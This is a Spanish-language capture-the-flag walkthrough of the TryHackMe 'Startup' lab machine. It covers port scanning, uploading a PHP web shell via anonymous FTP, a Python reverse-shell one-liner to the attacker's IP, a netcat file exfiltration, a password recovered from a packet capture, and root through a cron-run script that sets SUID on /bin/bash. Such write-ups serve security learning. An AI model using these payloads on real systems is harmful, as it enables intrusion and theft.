---
title: Try Hack Me Startup
author: k4miyo
date: 2023-06-25
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [Wireshark, Cron, Gobuster, Enumeration]
ping: true
---

## Máquina Startup
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.77.120.

```bash
❯ ping -c 1 10.10.77.120
PING 10.10.77.120 (10.10.77.120) 56(84) bytes of data.
64 bytes from 10.10.77.120: icmp_seq=1 ttl=63 time=155 ms

--- 10.10.77.120 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 154.566/154.566/154.566/0.000 ms

```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.77.120 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 20:47 CST
Initiating Parallel DNS resolution of 1 host. at 20:47
Completed Parallel DNS resolution of 1 host. at 20:47, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:47
Scanning 10.10.77.120 [65535 ports]
Discovered open port 22/tcp on 10.10.77.120
Discovered open port 80/tcp on 10.10.77.120
Discovered open port 21/tcp on 10.10.77.120
Completed SYN Stealth Scan at 20:47, 21.92s elapsed (65535 total ports)
Nmap scan report for 10.10.77.120
Host is up, received user-set (0.15s latency).
Scanned at 2023-06-25 20:47:29 CST for 22s
Not shown: 65423 closed tcp ports (reset), 109 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.04 seconds
           Raw packets sent: 108177 (4.760MB) | Rcvd: 101211 (4.048MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
───────┬────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.77.120
   5   │     [*] Open ports: 21,22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,22,80 10.10.77.120 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 20:48 CST
Nmap scan report for 10.10.77.120
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.85.95
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds

```

Lo primero que debemos observar es que se encuentra habilitado el usuario **anonymous** para el servicio de FTP, por lo que vamos a entrar a echarle un ojo:

```bash
❯ ftp 10.10.111.163
Connected to 10.10.111.163.
220 (vsFTPd 3.0.3)
Name (10.10.111.163:k4miyo): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp>
```

Nos llevamos los archivos a nuestro equipo de trabajo para ver su contenido.

```bash
ftp> get important.jpg 
local: important.jpg remote: important.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.65 secs (380.0646 kB/s)
ftp> get notice.txt 
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00 secs (919.1177 kB/s)
ftp> quit
221 Goodbye.
❯ cat notice.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: notice.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but 
       │ Maya is looking pretty sus.
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

![""](/assets/images/thm-startup/important.jpg)

No vemos nada interesante, por lo que ahora vamos a echarle un ojo al sitio web, pero antes siempre saber a lo que nos enfrentamos con nuestra herramienta de confianza `whatweb`:

```bash
❯ whatweb http://10.10.111.163
http://10.10.111.163 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], Email[#], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.111.163], Title[Maintenance]
```

![""](/assets/images/thm-startup/startup.png)

No vemos nada interesante por web, así que trataremos que buscar directorios:

```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.77.120/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.77.120/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000080:   200        18 L     79 W       1331 Ch     "files"                                                                                                                     
^C000012591:   404        9 L      31 W       274 Ch      "usa_flag"                                                                                                                  

Total time: 0
Processed Requests: 12590
Filtered Requests: 12589
Requests/sec.: 0
```

Se tiene el recurso `files`, asi que vamos a ver su contenido:

![""](/assets/images/thm-startup/startup2.png)

Se tiene la misma estructura que encontramos vía ftp, por lo que ya debemos estar pensando en subir un archivo php para lograr la ejecución de comandos a nivel de sistema.

```bash
❯ cat neutrino.php
───────┬───────────────────────────────────────────────────────────────
       │ File: neutrino.php
───────┼───────────────────────────────────────────────────────────────
   1   │ <?php
   2   │     echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
   3   │ ?>
───────┴───────────────────────────────────────────────────────────────
```

```bash
❯ ftp 10.10.111.163
Connected to 10.10.111.163.
220 (vsFTPd 3.0.3)
Name (10.10.111.163:k4miyo): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put neutrino.php
local: neutrino.php remote: neutrino.php
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp>
```

Vemos que no nos deja subir el archivo, así que probemos en el directorio **ftp**:

```bash
ftp> cd ftp
250 Directory successfully changed.
ftp> put neutrino.php
local: neutrino.php remote: neutrino.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
65 bytes sent in 0.00 secs (1.0507 MB/s)
ftp> 
```

Hemos logrado subir el archivo y ya podemos visualizarlo vía web:

![""](/assets/images/thm-startup/startup3.png)

![""](/assets/images/thm-startup/startup4.png)

Ya tenemos ejecución de comandos a nivel de sistema, por lo tanto vamos a entablarnos una reverse shell por el puerto 443:

```bash
10.10.111.163/files/ftp/neutrino.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.85.95",8443);os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
❯ nc -nlvp 8443
listening on [any] 8443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.111.163] 49546
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya nos encontramos dentro de la máquina y para trabajar más cómodos, haremos un [Tratamiento de la tty](/posts/tratamiento-tty).  En el directorio root ya podemos ver la primer flag en el archivo `recipe.txt`:

```bash
www-data@startup:/var/www/html/files/ftp$ cd /
www-data@startup:/$ ls -la
total 100
drwxr-xr-x  25 root     root      4096 Jun 29 05:51 .
drwxr-xr-x  25 root     root      4096 Jun 29 05:51 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Jun 29 05:50 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 130 root     root         0 Jun 29 05:50 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       920 Jun 29 06:00 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Jun 29 05:50 sys
drwxrwxrwt   7 root     root      4096 Jun 29 06:08 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
www-data@startup:/$
```

Asi mismo, en dicho directorio, vemos `incidents`, cuya carpeta pertenece al usuario `www-data`, así que vamos a ingresar para ver el contenido.

```bash
www-data@startup:/$ cd incidents/
www-data@startup:/incidents$ ls -la
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 Jun 29 05:51 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
www-data@startup:/incidents$ 
```

Tenemos un archivo `pcapng`, por lo tanto vamos llevarlo a nuestra máquina para ver el contenido:

```bash
www-data@startup:/incidents$ nc 10.9.85.95 10443 < suspicious.pcapng 
www-data@startup:/incidents$ md5sum suspicious.pcapng 
f76148f80bf651f94619f18958e1fb4c  suspicious.pcapng
www-data@startup:/incidents$
```

```bash
❯ nc -nlvp 10443 > suspicious.pcapng
listening on [any] 10443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.111.163] 44830
❯ md5sum suspicious.pcapng
f76148f80bf651f94619f18958e1fb4c  suspicious.pcapng
```

Ahora si, observemos el contenido:

```bash
❯ tcpdump -qns 0 -A -r suspicious.pcapng | less
12:40:18.078837 IP 192.168.22.139.55280 > 13.32.85.44.443: tcp 0
E..(..@.@..5..... U,....cb..R..;P..<9...
12:40:18.079287 IP 13.32.85.44.443 > 192.168.22.139.55280: tcp 0
E..( 
.....F. U,........R..;cb..P....A........
12:40:18.335026 IP 192.168.22.139.38750 > 104.107.60.16.80: tcp 0
E..(..@.@..h....hk<..^.Pu.}UvZ WP..p{...
12:40:18.335159 IP 192.168.33.1.48974 > 192.168.33.10.80: tcp 0
E..4.s@.@.....!...!
.N.P.$q....?...?=......
.i\....F
...
12:41:33.666734 IP 192.168.22.139.4444 > 192.168.22.139.40934: tcp 8
E..<.|@.@............\....../5.U...@.......
*.?.*...sudo -l

12:41:33.670131 IP 192.168.22.139.40934 > 192.168.22.139.4444: tcp 9
E..=%.@.@.gM...........\/5.U.......@.......
*.?.*.?.sudo -l

12:41:33.670148 IP 192.168.22.139.4444 > 192.168.22.139.40934: tcp 0
E..4.}@.@............\....../5.^...@.......
*.?.*.?.
12:41:33.683386 IP 192.168.22.139.40934 > 192.168.22.139.4444: tcp 30
E..R%.@.@.g7...........\/5.^.......@.......
*.@     *.?.[sudo] password for www-data: 
12:41:33.683399 IP 192.168.22.139.4444 > 192.168.22.139.40934: tcp 0
E..4.~@.@............\....../5.|...@.......
*.@     *.@     
12:41:36.248419 IP 192.168.22.139.4444 > 192.168.22.139.40934: tcp 19
E..G..@.@............\....../5.|...@.......
*.J.*.@ c4ntg3t3n0ughsp1c3
...
```

Vemos una contraseña utilizar para ejecutar el comando `sudo -l` del usuario `www-data`; sin embargo, al autenticación es incorrecta y podría ser que dicha contraseña sea de otro usuario.

```bash
www-data@startup:/incidents$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/incidents$ 
```

Podríamos tratar de acceder como el usuario **lennie** y la contraseña que encontramos **c4ntg3t3n0ughsp1c3** por medio de ssh:

```bash
❯ ssh lennie@10.10.111.163
The authenticity of host '10.10.111.163 (10.10.111.163)' can't be established.
ECDSA key fingerprint is SHA256:xXyVGVy1l27TVcjIQj2kgTTmLYN6WCB93YJB3mAHLkA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.111.163' (ECDSA) to the list of known hosts.
lennie@10.10.111.163's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ 
```

Ya somos el usuario **lennie** y podemos visualizar la flag (user.txt).

```bash
lennie@startup:~$ ls -la
total 28
drwx------ 5 lennie lennie 4096 Jun 29 06:17 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
-rw------- 1 lennie lennie    5 Jun 29 06:17 .bash_history
drwx------ 2 lennie lennie 4096 Jun 29 06:17 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$
```

Dentro del directorio HOME de **lennie** podemos ver la carpeta `scripts` cuyo propietario es **root**, vamos a ver su contenido:

```bash
lennie@startup:~$ cd scripts/
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Jun 29 06:17 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jun 29 06:19 startup_list.txt
lennie@startup:~/scripts$
```

Vemos un script llamado `planner.sh` y el archivo `startup_list.txt`. Como tenemos permisos de lectura, vamos a echarles un ojo:

```bash
lennie@startup:~/scripts$ cat startup_list.txt 

lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$
```

Vemos que el script, a parte de guardar el contenido de la variable `LIST` en el archivo `startup_list.txt`, manda llamar otro script.

```bash
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$
```

Ojito, el otro script `/etc/print.sh` nosotros somos los dueños, por lo tanto, podemos editarlo. Suponiendo que el script `planner.sh` lo ejecute **root** mediante una tarea programada; si cambiamos el contenido de `/etc/print.sh`, significa que **root** también ejecutará nuestro script con el nuevo contenido, por lo tanto:

```bash
lennie@startup:~/scripts$ nano /etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
chmod 7755 /bin/bash
lennie@startup:~/scripts$ 
```

Tratamos de hacer SUID a `/bin/bash`. Si esperamos aproximadamente como 1 minuto en lo que **root** ejecuta nuestro script:

```bash
lennie@startup:~/scripts$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
lennie@startup:~/scripts$
lennie@startup:~/scripts$ ls -la /bin/bash
-rwsr-sr-t 1 root root 1037528 Jul 12  2019 /bin/bash
lennie@startup:~/scripts$
```

La `/bin/bash` ya es SUID, por lo tanto ya podemos convertirnos en **root**:

```bash
lennie@startup:~/scripts$ bash -p
bash-4.3# whoami
root
bash-4.3#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).